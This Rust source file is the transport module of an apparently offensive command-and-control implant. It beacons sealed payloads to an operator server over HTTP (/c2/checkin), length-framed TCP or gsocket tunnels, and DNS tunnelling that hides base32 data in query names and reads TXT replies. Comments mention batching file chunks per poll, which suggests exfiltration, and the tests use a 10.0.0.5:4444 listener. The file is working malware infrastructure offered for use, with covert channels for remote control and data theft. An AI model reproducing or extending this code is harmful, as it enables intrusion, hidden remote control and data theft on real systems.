use reqwest::Client;
use serde::Serialize;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

/// A C2 transport. The wire content is a sealed (AEAD) envelope blob; the
/// transport only moves opaque bytes and chooses the framing. Chosen at runtime
/// from the endpoint scheme, so the protocol is not baked into the binary.
///
/// `tcp://` and `gs://` share length-framed TCP: gsocket is a TCP tunnel
/// (the local gsocket port is an ordinary TCP socket), so both use the same
/// `[u32 BE len][sealed bytes]` framing.
#[derive(Clone)]
pub enum Transport {
    Http {
        client: Client,
        base: String,
    },
    Tcp {
        host: String,
        port: u16,
    },
    Dns {
        host: String,
        port: u16,
    },
}

impl Transport {
    /// Build a transport from an endpoint string by its scheme.
    pub fn from_endpoint(endpoint: &str) -> Result<Self, String> {
        let (scheme, rest) = endpoint
            .split_once("://")
            .ok_or_else(|| format!("endpoint {endpoint:?} has no scheme"))?;
        match scheme {
            "http" | "https" => Ok(Transport::Http {
                client: Client::new(),
                base: endpoint.trim_end_matches('/').to_owned(),
            }),
            "tcp" | "gs" => {
                let host = rest
                    .rsplit_once(':')
                    .map(|(h, _)| h)
                    .unwrap_or(rest)
                    .trim_matches(['[', ']'])
                    .to_owned();
                let port = rest
                    .rsplit_once(':')
                    .and_then(|(_, p)| p.parse::<u16>().ok())
                    .ok_or_else(|| format!("endpoint {endpoint:?} has no valid tcp port"))?;
                if host.is_empty() {
                    return Err(format!("endpoint {endpoint:?} has no host"));
                }
                Ok(Transport::Tcp { host, port })
            }
            "dns" => {
                let (host, port) = rest
                    .rsplit_once(':')
                    .map(|(h, p)| (h.to_owned(), p.parse::<u16>().unwrap_or(53)))
                    .unwrap_or((rest.to_owned(), 53));
                Ok(Transport::Dns { host, port })
            }
            other => Err(format!("unsupported protocol scheme {other:?}")),
        }
    }

    /// A canonical string for the configured transport (for introspection).
    pub fn describe(&self) -> String {
        match self {
            Transport::Http { base, .. } => base.clone(),
            Transport::Tcp { host, port } => format!("tcp://{host}:{port}"),
            Transport::Dns { host, port } => format!("dns://{host}:{port}"),
        }
    }

    /// Max inner plaintext bytes a single sealed frame can carry on this
    /// transport (sealed bytes are base64, and base64'd again on DNS). Used to
    /// size file-chunk batches per poll.
    pub fn inner_budget(&self) -> usize {
        match self {
            Transport::Http { .. } | Transport::Tcp { .. } => 32 * 1024,
            Transport::Dns { .. } => 1200,
        }
    }

    /// Round-trip one sealed frame (base64 string bytes): send, read the reply
    /// frame, return its raw (sealed) bytes. No envelope parsing here.
    pub async fn exchange(&self, sealed: &[u8]) -> Result<Vec<u8>, String> {
        match self {
            Transport::Http { client, base } => http_exchange(client, base, sealed).await,
            Transport::Tcp { host, port } => tcp_exchange(host, *port, sealed).await,
            Transport::Dns { host, port } => dns_exchange(host, *port, sealed).await,
        }
    }
}

async fn dns_exchange(host: &str, port: u16, sealed: &[u8]) -> Result<Vec<u8>, String> {
    use nw_profile::dns;

    if sealed.len() > dns::MAX_FRAME {
        return Err(format!(
            "dns exchange too large ({} > {})",
            sealed.len(),
            dns::MAX_FRAME
        ));
    }
    let b32 = dns::base32_encode(sealed);

    // Query packet with a random id and the base32 in QNAME, marker-terminated.
    let mut query = Vec::new();
    let id: u16 = rand::random();
    query.extend_from_slice(&id.to_be_bytes());
    query.extend_from_slice(&[0x01, 0x00]); // RD
    query.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    query.extend_from_slice(&[0, 0, 0, 0, 0, 0]); // AN/NS/AR
    for chunk in b32.as_bytes().chunks(63) {
        query.push(chunk.len() as u8);
        query.extend_from_slice(chunk);
    }
    query.push(dns::MARKER.len() as u8);
    query.extend_from_slice(dns::MARKER.as_bytes());
    query.push(0);
    query.extend_from_slice(&1u16.to_be_bytes()); // A
    query.extend_from_slice(&1u16.to_be_bytes()); // IN

    let addr = tokio::net::lookup_host((host, port))
        .await
        .map_err(|e| format!("dns resolve {host}:{port}: {e}"))?
        .next()
        .ok_or_else(|| format!("no address for {host}:{port}"))?;
    let sock = tokio::net::UdpSocket::bind((host_for_bind(host), 0))
        .await
        .map_err(|e| format!("dns bind: {e}"))?;
    tokio::time::timeout(Duration::from_secs(30), sock.send_to(&query, addr))
        .await
        .map_err(|_| "dns send timeout".to_string())?
        .map_err(|e| format!("dns send: {e}"))?;

    let timeout = Duration::from_secs(5);
    let mut buf = vec![0u8; 4096];
    let (n, _) = tokio::time::timeout(timeout, sock.recv_from(&mut buf))
        .await
        .map_err(|_| "dns recv timeout".to_string())?
        .map_err(|e| format!("dns recv: {e}"))?;
    let txts = dns::parse_txt(&buf[..n]).map_err(|e| format!("dns parse: {e}"))?;
    let joined = txts.join("");
    let pt = dns::base32_decode(&joined).map_err(|_| "dns b32 decode".to_string())?;
    Ok(pt)
}

fn host_for_bind(host: &str) -> &str {
    match host {
        "localhost" => "127.0.0.1",
        h => h,
    }
}

async fn http_exchange(client: &Client, base: &str, sealed: &[u8]) -> Result<Vec<u8>, String> {
    let url = format!("{base}/c2/checkin");
    let resp = client
        .post(&url)
        .body(sealed.to_vec())
        .send()
        .await
        .map_err(|e| e.to_string())?;
    let resp = resp.error_for_status().map_err(|e| e.to_string())?;
    let body = resp.bytes().await.map_err(|e| e.to_string())?;
    Ok(body.to_vec())
}

async fn tcp_exchange(host: &str, port: u16, sealed: &[u8]) -> Result<Vec<u8>, String> {
    let timeout = Duration::from_secs(30);
    let addr = tokio::net::lookup_host((host, port))
        .await
        .map_err(|e| format!("resolve {host}:{port}: {e}"))?
        .next()
        .ok_or_else(|| format!("no address for {host}:{port}"))?;
    let mut stream = tokio::time::timeout(timeout, TcpStream::connect(addr))
        .await
        .map_err(|_| "tcp connect timeout".to_string())?
        .map_err(|e| format!("tcp connect {addr}: {e}"))?;

    let mut frame = Vec::with_capacity(4 + sealed.len());
    frame.extend_from_slice(&(sealed.len() as u32).to_be_bytes());
    frame.extend_from_slice(sealed);
    tokio::time::timeout(timeout, stream.write_all(&frame))
        .await
        .map_err(|_| "tcp write timeout".to_string())?
        .map_err(|e| format!("tcp write: {e}"))?;

    let mut len_buf = [0u8; 4];
    tokio::time::timeout(timeout, stream.read_exact(&mut len_buf))
        .await
        .map_err(|_| "tcp read timeout".to_string())?
        .map_err(|e| format!("tcp read len: {e}"))?;
    let body_len = u32::from_be_bytes(len_buf) as usize;
    if body_len > 8 * 1024 * 1024 {
        return Err(format!("tcp frame too large ({body_len})"));
    }
    let mut reply = vec![0u8; body_len];
    tokio::time::timeout(timeout, stream.read_exact(&mut reply))
        .await
        .map_err(|_| "tcp read timeout".to_string())?
        .map_err(|e| format!("tcp read body: {e}"))?;
    Ok(reply)
}

/// Serialize the length-prefixed frame a TCP server writes back (shared framing).
pub fn frame_bytes(body: &[u8]) -> Vec<u8> {
    let mut f = Vec::with_capacity(4 + body.len());
    f.extend_from_slice(&(body.len() as u32).to_be_bytes());
    f.extend_from_slice(body);
    f
}

/// Length-prefix framing for an already-serialized JSON body (compat helper).
pub fn frame(env: &impl Serialize) -> Vec<u8> {
    frame_bytes(&serde_json::to_vec(env).unwrap_or_default())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scheme_selects_transport() {
        assert!(matches!(
            Transport::from_endpoint("http://h:80").unwrap(),
            Transport::Http { .. }
        ));
        assert!(matches!(
            Transport::from_endpoint("tcp://10.0.0.5:4444").unwrap(),
            Transport::Tcp { .. }
        ));
        assert!(matches!(
            Transport::from_endpoint("gs://localhost:4630").unwrap(),
            Transport::Tcp { .. }
        ));
        assert!(matches!(
            Transport::from_endpoint("dns://dns.example.com").unwrap(),
            Transport::Dns { .. }
        ));
        assert!(Transport::from_endpoint("ftp://x:1").is_err());
        assert!(Transport::from_endpoint("naked").is_err());
    }

    #[test]
    fn tcp_addr_parsed() {
        if let Transport::Tcp { host, port } = Transport::from_endpoint("tcp://10.0.0.5:4444").unwrap() {
            assert_eq!(host, "10.0.0.5");
            assert_eq!(port, 4444);
        } else {
            panic!("expected Tcp");
        }
    }

    #[test]
    fn frame_has_length_prefix() {
        let body = b"hello".to_vec();
        let f = frame_bytes(&body);
        assert_eq!(u32::from_be_bytes([f[0], f[1], f[2], f[3]]), 5);
        assert_eq!(&f[4..], b"hello");
    }
}

